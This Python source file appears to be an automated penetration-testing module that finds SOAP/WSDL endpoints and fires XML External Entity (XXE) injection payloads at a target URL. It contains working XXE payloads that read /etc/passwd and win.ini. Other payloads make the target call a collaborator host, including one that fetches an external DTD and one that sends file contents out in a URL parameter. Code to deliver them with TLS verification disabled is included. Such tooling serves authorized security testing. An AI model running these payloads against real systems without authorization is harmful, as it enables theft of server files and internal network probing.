"""SOAP/WSDL Scanner + XXE Injection — Task 18.8 (XBOW-inspired).

Detects and tests:
  1. SOAP/WSDL endpoints — discovers XML-based web services
  2. XXE (XML External Entity) injection via:
     - Classic file read: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     - OOB/Blind XXE via Burp Collaborator URL
     - SSRF via XXE (internal network probe)
  3. SOAP injection — tampering with XML operation parameters

Usage:
    scanner = SoapXxeScanner(base_url="https://target.com", burp_collaborator=collab_url)
    results = await scanner.scan(auth_headers={...})
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx

log = logging.getLogger(__name__)

# ── Known WSDL/SOAP endpoint patterns ────────────────────────────────────────

WSDL_PATHS = [
    "?wsdl", "?WSDL", "/wsdl", "/service.wsdl", "/services?wsdl",
    "/ws", "/soap", "/api/soap", "/WebService.asmx?wsdl",
    "/Service.asmx?wsdl", "/services/", "/axis/", "/axis2/",
    "/jws/", "/_vti_bin/", "/WSRegistry.asmx?wsdl",
]

# Common XML content-type indicators
XML_CONTENT_TYPES = (
    "text/xml", "application/xml", "application/soap+xml",
    "application/xhtml+xml", "text/html",
)

# XXE payloads
XXE_FILE_READ = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

XXE_FILE_READ_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

XXE_SSRF_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{collaborator_url}/xxe-probe">
]>
<root><data>&xxe;</data></root>"""

XXE_OOB_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://{collaborator_url}/evil.dtd">
  %remote;
]>
<root><data>&exfil;</data></root>"""

XXE_PARAMETER_ENTITY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY xxe SYSTEM 'http://{collaborator_url}/?x=%payload;'>">
  %wrapper;
]>
<root>&xxe;</root>"""

# Linux file content indicators
XXE_LINUX_SIGNALS = ["root:x:0:0", "daemon:x:", "/bin/sh", "nobody:x:"]
# Windows file content indicators
XXE_WINDOWS_SIGNALS = ["[boot loader]", "[operating systems]", "; for 16-bit", "MSDOS.SYS"]


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class WsdlEndpoint:
    url: str
    operations: list[str] = field(default_factory=list)
    namespace: str = ""
    service_name: str = ""


@dataclass
class XxeFinding:
    vuln_class: str = "XXE"
    title: str = ""
    severity: str = "critical"
    target_url: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    source: str = "soap_xxe_scanner"

    def to_dict(self) -> dict:
        return {
            "vuln_class": self.vuln_class,
            "title": self.title,
            "severity": self.severity,
            "target_url": self.target_url,
            "payload": self.payload,
            "description": self.description,
            "evidence": self.evidence,
            "source": self.source,
        }


# ── Scanner ───────────────────────────────────────────────────────────────────

class SoapXxeScanner:
    """SOAP/WSDL discovery + XXE injection scanner."""

    def __init__(
        self,
        base_url: str,
        burp_collaborator: str | None = None,
        proxy_url: str | None = None,
        timeout: float = 15.0,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.collaborator = burp_collaborator
        self.proxy_url = proxy_url
        self.timeout = timeout

    async def scan(
        self,
        auth_headers: dict[str, str] | None = None,
        auth_cookies: dict[str, str] | None = None,
    ) -> list[dict]:
        """Run full SOAP/WSDL discovery + XXE injection scan.

        Returns list of finding dicts.
        """
        findings: list[dict] = []

        # Step 1: Discover WSDL endpoints
        wsdl_endpoints = await self._discover_wsdl(auth_headers, auth_cookies)
        if wsdl_endpoints:
            log.info("[soap_xxe] Found %d WSDL endpoint(s)", len(wsdl_endpoints))
        else:
            # No WSDL — still probe for blind XXE on any XML-accepting endpoints
            log.info("[soap_xxe] No WSDL found — probing base URL for XML inputs")

        # Step 2: XXE injection
        targets = [(ep.url, ep.operations) for ep in wsdl_endpoints]
        if not targets:
            targets = [(self.base_url, [])]

        for url, operations in targets:
            xxe_findings = await self._test_xxe(
                url=url,
                operations=operations,
                auth_headers=auth_headers,
                auth_cookies=auth_cookies,
            )
            findings.extend(f.to_dict() for f in xxe_findings)

        return findings

    async def _discover_wsdl(
        self,
        auth_headers: dict[str, str] | None = None,
        auth_cookies: dict[str, str] | None = None,
    ) -> list[WsdlEndpoint]:
        """Probe common WSDL paths and return discovered endpoints."""
        endpoints: list[WsdlEndpoint] = []
        headers = {
            "User-Agent": "Mozilla/5.0 (PentraAI/1.0 SOAPScanner)",
            "Accept": "text/xml,application/xml,*/*",
            **(auth_headers or {}),
        }
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=self.timeout,
            verify=False,   # noqa: S501
            **(dict(proxy=self.proxy_url) if self.proxy_url else {}),
        ) as client:
            for path in WSDL_PATHS:
                url = self.base_url + path
                try:
                    resp = await client.get(url, headers=headers, cookies=auth_cookies or None)
                    if resp.status_code == 200 and self._looks_like_wsdl(resp.text):
                        ep = self._parse_wsdl(url, resp.text)
                        endpoints.append(ep)
                        log.info("[soap_xxe] WSDL found: %s (%d operations)", url, len(ep.operations))
                except Exception as exc:
                    log.debug("[soap_xxe] WSDL probe %s: %s", url, exc)

        return endpoints

    def _looks_like_wsdl(self, text: str) -> bool:
        """Heuristic: does the response look like WSDL/SOAP XML?"""
        lower = text.lower()
        return any(sig in lower for sig in [
            "definitions", "wsdl", "soap:binding", "porttype",
            "targetnamespace", "<?xml", "<definitions",
        ])

    def _parse_wsdl(self, url: str, wsdl_text: str) -> WsdlEndpoint:
        """Extract operation names and service name from WSDL."""
        # Simple regex extraction — no full XML parse needed
        operations = re.findall(r'<operation[^>]+name=["\']([^"\']+)["\']', wsdl_text, re.IGNORECASE)
        service_names = re.findall(r'<service[^>]+name=["\']([^"\']+)["\']', wsdl_text, re.IGNORECASE)
        namespaces = re.findall(r'targetNamespace=["\']([^"\']+)["\']', wsdl_text, re.IGNORECASE)
        return WsdlEndpoint(
            url=url.split("?")[0],  # strip ?wsdl query
            operations=list(set(operations))[:10],
            service_name=service_names[0] if service_names else "",
            namespace=namespaces[0] if namespaces else "",
        )

    async def _test_xxe(
        self,
        url: str,
        operations: list[str],
        auth_headers: dict[str, str] | None = None,
        auth_cookies: dict[str, str] | None = None,
    ) -> list[XxeFinding]:
        """Send XXE payloads to target URL."""
        findings: list[XxeFinding] = []
        headers = {
            "User-Agent": "Mozilla/5.0 (PentraAI/1.0 XXEScanner)",
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": '""',
            **(auth_headers or {}),
        }
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=self.timeout,
            verify=False,  # noqa: S501
            **({"proxy": self.proxy_url} if self.proxy_url else {}),
        ) as client:

            # ── Test 1: Linux file read ───────────────────────────────────────
            try:
                resp = await client.post(
                    url, headers=headers, cookies=auth_cookies or None,
                    content=XXE_FILE_READ.encode(),
                )
                body = resp.text
                found_signals = [s for s in XXE_LINUX_SIGNALS if s in body]
                if found_signals:
                    findings.append(XxeFinding(
                        title=f"XXE — /etc/passwd exposed at {urlparse(url).path}",
                        severity="critical",
                        target_url=url,
                        payload=XXE_FILE_READ,
                        evidence=body[:500],
                        description=(
                            f"XXE injection confirmed: server returned /etc/passwd content.\n"
                            f"Signal: {found_signals[0]!r}\n\n"
                            "An attacker can read arbitrary files from the server filesystem, "
                            "potentially exposing credentials, private keys, and configuration files."
                        ),
                    ))
                    log.info("[soap_xxe] XXE CONFIRMED (Linux /etc/passwd) at %s", url)
            except Exception as exc:
                log.debug("[soap_xxe] XXE Linux probe failed: %s", exc)

            # ── Test 2: Windows file read ─────────────────────────────────────
            if not findings:  # skip if already confirmed
                try:
                    resp = await client.post(
                        url, headers=headers, cookies=auth_cookies or None,
                        content=XXE_FILE_READ_WIN.encode(),
                    )
                    body = resp.text
                    found_signals = [s for s in XXE_WINDOWS_SIGNALS if s in body]
                    if found_signals:
                        findings.append(XxeFinding(
                            title=f"XXE — Windows win.ini exposed at {urlparse(url).path}",
                            severity="critical",
                            target_url=url,
                            payload=XXE_FILE_READ_WIN,
                            evidence=body[:500],
                            description=(
                                f"XXE injection confirmed: server returned win.ini content.\n"
                                f"Signal: {found_signals[0]!r}"
                            ),
                        ))
                        log.info("[soap_xxe] XXE CONFIRMED (Windows win.ini) at %s", url)
                except Exception as exc:
                    log.debug("[soap_xxe] XXE Windows probe failed: %s", exc)

            # ── Test 3: OOB/Blind XXE via Collaborator ────────────────────────
            if self.collaborator and not findings:
                try:
                    payload = XXE_SSRF_TEMPLATE.format(collaborator_url=self.collaborator)
                    await client.post(
                        url, headers=headers, cookies=auth_cookies or None,
                        content=payload.encode(),
                    )
                    # OOB hit is detected via Collaborator polling — record as potential
                    log.info("[soap_xxe] Blind XXE probe sent to %s (check Collaborator: %s)", url, self.collaborator)
                    findings.append(XxeFinding(
                        title=f"Potential Blind XXE at {urlparse(url).path}",
                        severity="high",
                        target_url=url,
                        payload=payload,
                        evidence=f"OOB probe sent to Collaborator: {self.collaborator}",
                        description=(
                            f"XXE OOB payload sent. Check Burp Collaborator for DNS/HTTP "
                            f"interaction from the target server. "
                            f"Collaborator URL: {self.collaborator}"
                        ),
                    ))
                except Exception as exc:
                    log.debug("[soap_xxe] Blind XXE probe failed: %s", exc)

        return findings


# ── Convenience function ──────────────────────────────────────────────────────

async def scan_soap_xxe(
    base_url: str,
    burp_collaborator: str | None = None,
    proxy_url: str | None = None,
    auth_headers: dict[str, str] | None = None,
    auth_cookies: dict[str, str] | None = None,
) -> list[dict]:
    """Top-level entry point: scan for SOAP/WSDL endpoints + XXE vulnerabilities."""
    scanner = SoapXxeScanner(
        base_url=base_url,
        burp_collaborator=burp_collaborator,
        proxy_url=proxy_url,
    )
    return await scanner.scan(auth_headers=auth_headers, auth_cookies=auth_cookies)
